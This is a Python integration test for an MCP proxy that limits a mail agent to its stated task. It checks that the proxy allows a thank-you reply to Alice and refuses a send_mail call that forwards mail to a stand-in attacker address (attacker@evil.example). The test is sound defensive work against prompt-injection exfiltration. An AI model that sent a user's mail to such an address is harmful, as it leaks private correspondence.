"""conrac-be: the README's own MCP block, as a scripted host: demo_mcp_server.py behind mcp_proxy.py with the README's --task. CPU, no model."""

import asyncio
import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
TASK = "Read my inbox and reply to Alice's mail with a short thank-you."


def run(task):
    import importlib.util

    import pytest

    if importlib.util.find_spec("mcp") is None:
        if os.environ.get("SPW_REQUIRE_INTEGRATIONS") == "1":
            pytest.fail("Install the MCP SDK to run required integration tests")
        pytest.skip("Install the MCP SDK to run this stdio integration test")
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client

    env = {k: os.environ[k] for k in ("HOME", "LOGNAME", "PATH", "SHELL", "TERM", "USER") if k in os.environ}
    params = StdioServerParameters(
        command=sys.executable,
        cwd=str(HERE),
        env=env,
        args=[str(HERE / "mcp_proxy.py"), "--task", task, "--", sys.executable, str(HERE / "demo_mcp_server.py")],
    )

    async def session():
        async with stdio_client(params) as (read, write), ClientSession(read, write) as client:
            await client.initialize()
            tools = (await client.list_tools()).tools
            read_result = await client.call_tool("get_mail", {})
            legit = await client.call_tool("send_mail", {"recipients": ["alice@example.com"], "body": "Thank you."})
            attack = await client.call_tool("send_mail", {"recipients": ["attacker@evil.example"], "body": "fwd"})
            return [t.name for t in tools], read_result.content[0].text, legit, attack

    return asyncio.run(asyncio.wait_for(session(), 90))


def test_readme_mcp_block_admits_the_reply_to_alice_and_refuses_the_attacker():
    names, text, legit, attack = run(TASK)
    print("DEMO tools", names)
    print("DEMO legit reply refused:", legit.is_error, "|", legit.content[0].text[:200].replace("\n", " "))
    print("DEMO attacker refused:", attack.is_error)
    assert attack.is_error
    assert not legit.is_error, "the README's own MCP example refuses the reply the task asks for"
